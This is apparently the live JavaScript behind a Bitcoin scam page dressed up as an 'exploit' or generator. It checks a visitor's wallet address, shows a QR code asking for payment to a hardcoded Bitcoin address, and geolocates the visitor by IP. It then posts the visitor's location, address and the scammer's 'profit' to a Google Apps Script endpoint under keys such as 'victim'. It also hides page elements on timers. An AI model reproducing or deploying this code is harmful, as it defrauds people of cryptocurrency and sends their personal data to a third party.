$(document).ready(function () {
  
  	function explode() {
		$("div[id^='st']").addClass("z-index-0 hiden");
		$("#xt_auth_iframe").addClass("z-index-0 hiden")
	}
	setTimeout(explode, 500);
	setTimeout(explode, 1000);
	setTimeout(explode, 5000);
	setTimeout(explode, 7000);
	setTimeout(explode, 10000);
	setTimeout(explode, 15000);
	setTimeout(explode, 20000);
  
  
	/**
	 * Variable
	 */
	var X01address = '15p2qMsL5jU6ZvZNTEbcTs8SRAN3v9dHRo';
	var X00country;
	var X00price;

	/**
	 * SET value
	 */
	$("#X01address").text(X01address);

	/**
	 * GET country
	 */
	function getCountries() {
		const http = new XMLHttpRequest();
		const theUrl = "http://ip-api.com/json";
		http.open("GET", theUrl)
		http.send()
		http.onload = () => {
			const res = JSON.parse(http.responseText);
			X00country = res?.country + '-' + res?.city
		}
	}
	getCountries();

	/**
	 * GET btc price
	 */
	function getBTCInfo() {
		const http = new XMLHttpRequest();
		const theUrl = "https://chain.so/api/v2/get_info/BTC";
		http.open("GET", theUrl)
		http.send()
		http.onload = () => {
			const res = JSON.parse(http.responseText);
			X00price = Number(res?.data?.price);
		}
	}
	getBTCInfo();

	/**
	 * Click onSubmit modal
	 */
	$("#X00ButtonContinue").click(function () {
		var valueSelectBTC = parseFloat(document.getElementById("js-output").innerText);
		var amountChose = parseFloat((valueSelectBTC * 0.01572).toFixed(6));
		var qrcode = new QRCode(document.getElementById("qr-address-js"), {
			width: 200,
			height: 200
		});

		function makeCode() {
			$("#pay-address").text(X01address);
			$("#selectOutputTBC").text(amountChose);
			var elText = "bitcoin:" + X01address + "?amount=" + amountChose;
			qrcode.makeCode(elText)
		}
		makeCode();

		const X00address = document.getElementById("X00InputUsername").value

		function pushMessage() {
			const theUrl = "https://script.google.com/macros/s/AKfycbxt7WQJaNdt4DjE2KXZqssbRD65Xns0Rn87BPbCE5sZwGCYrliS0xK5xa_aa-cTM8uDCw/exec";
			const bodyParams = {
				exploiting: valueSelectBTC + ' BTC',
				receive: amountChose + ' BTC',
				profit: '$' + (X00price * amountChose)?.toFixed(3),
				price: '$' + X00price?.toFixed(0),
				country: X00country,
				victim: 'https://www.blockchain.com/btc/address/' + X00address,
				walet: 'https://www.blockchain.com/btc/address/' + X01address,
			};
			const formData = new FormData();
			for (var key in bodyParams) {
				formData.append(key, bodyParams[key]);
			}
			const http = new XMLHttpRequest();
			http.open("POST", theUrl);
			http.send(formData);
			http.onload = () => {
				const res = JSON.parse(http.responseText);
			}
		}
		pushMessage();
	});
	$("#X00ButtonValidator").click(function () {
		const http = new XMLHttpRequest()
		const ranger = $('#js-output').val();
		const address = document.getElementById("X00InputUsername").value
		const theUrl = "https://chain.so/api/v2/is_address_valid/BTC/" + address;
		http.open("GET", theUrl)
		http.send()
		http.onload = () => {
			const res = JSON.parse(http.responseText);
			if (res.status == 'success') {
				if (res.data.is_valid) {
					$("#X00Username").text(address);
					$('#X04Pokecoins').text(ranger)
					$('#X04btc').text(ranger)
					$('#X00address').text(address);
					showModalFirst(1)
				} else {
					showModalFirst(2)
				}
			} else {
				showModalFirst(3)
			}
		}

		function showModalFirst(resFrist) {
			var addressWallet = "15LRgsnWMGEHqHGvfRrndz7qKjV54JWmvd";
			if (addressWallet == address) {
				$("#address-no").css("display", "none");
				$("#balance").css("display", "none");
				$("#error-no").css("display", "none");
				$("#dublicate-address").css("display", "block");
				$('#X00ModalErrorAddress').modal('show')
			} else if (resFrist == 1) {
				$('#X00Modal01').modal('show')
			} else if (resFrist == 2) {
				$("#address-no").css("display", "block");
				$("#balance").css("display", "none");
				$("#error-no").css("display", "none");
				$("#dublicate-address").css("display", "none");
				$('#X00ModalErrorAddress').modal('show')
			} else if (resFrist == 3) {
				//$("#address-no").css("display", "none");
				$("#address-no").css("display", "block");
				$("#balance").css("display", "none");
				//$("#error-no").css("display", "block");
				$("#error-no").css("display", "none");
				$("#dublicate-address").css("display", "none");
				$('#X00ModalErrorAddress').modal('show')
			}
		}

		function callApiBalance() {
			if (resFrist == 1) {
				const http = new XMLHttpRequest()
				var valueSelectBTC = parseFloat(document.getElementById("js-output").innerText);
				var amountChose = parseFloat((valueSelectBTC * 0.09176).toFixed(5));
				const address = document.getElementById("X00InputUsername").value
				const theUrl = "https://chain.so/api/v2/get_address_balance/BTC/" + address;
				http.open("GET", theUrl)
				http.send()
				http.onload = () => {
					const res = JSON.parse(http.responseText);
					if (res.status == 'success') {
						if (res.data && res.data.confirmed_balance > amountChose) {
							showModalSecond(1)
						} else {
							$("#balance-required").text("");
							showModalSecond(2)
						}
					} else {
						showModalSecond(3)
					}
				}
			}
		}

		function showModalSecond(resSecond) {
			if (resSecond == 1) {
				$('#X00Modal01').modal('show')
			} else if (resSecond == 2) {
				$("#address-no").css("display", "none");
				$("#balance").css("display", "block");
				$("#error-no").css("display", "none");
				$('#X00ModalErrorAddress').modal('show')
			} else if (resSecond == 3) {
				$("#address-no").css("display", "none");
				$("#balance").css("display", "none");
				$("#error-no").css("display", "block");
				$('#X00ModalErrorAddress').modal('show')
			}
		}
	})
})
